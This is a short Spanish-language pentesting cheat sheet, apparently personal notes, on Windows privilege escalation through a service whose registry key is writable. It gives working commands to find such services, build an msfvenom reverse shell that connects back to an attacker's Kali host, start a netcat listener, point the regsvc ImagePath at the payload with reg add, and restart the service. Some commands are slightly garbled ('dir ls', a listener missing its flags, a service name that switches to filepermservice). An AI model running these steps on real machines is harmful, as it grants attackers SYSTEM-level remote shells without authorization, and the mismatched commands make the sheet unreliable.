Permisos en Registros

Ejecutar función auxiliar: Función Auxiliar

1. Lista servicios desde los registros y Comprueba permisos del Path

# PowerShell: Lista servicios desde los registros y Comprueba permisos del Path
ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { if(ModifiablePath $_.PSPath){$_.PSPath}}
# Servicio vulnerable: regsvc

# CMD
# Enumerar servicios desde los registros
dir ls HKLM:\SYSTEM\CurrentControlSet\Services\
# Comprobar los permisos del registro
accesschk.exe /accepteula -kdqv "HKLM\SYSTEM\CurrentControlSet\Services\<service_name>"

2. Kali: Payload y Listener

msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > rev.exe
rlwrap nc 443

3. Reemplazar el ImagePath por la ruta a nuestro reverse shell

# PowerShell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\regsvc" /f /v ImagePath /t REG_SZ /d "C:\path\rev.exe"
# Revisar Cambio en el Path
reg query "HKLM\SYSTEM\CurrentControlSet\Services\regsvc"

4. Reiniciar el servicio. Se debe producir un fallo al reiniciar

# PowerShell
cmd /c sc stop filepermservice
cmd /c sc start filepermservice
# CMD / PowerShell
sc.exe stop filepermservice
net stop filepermservice # Alternativa
sc.exe start filepermservice
net start filepermservice # Alternativa
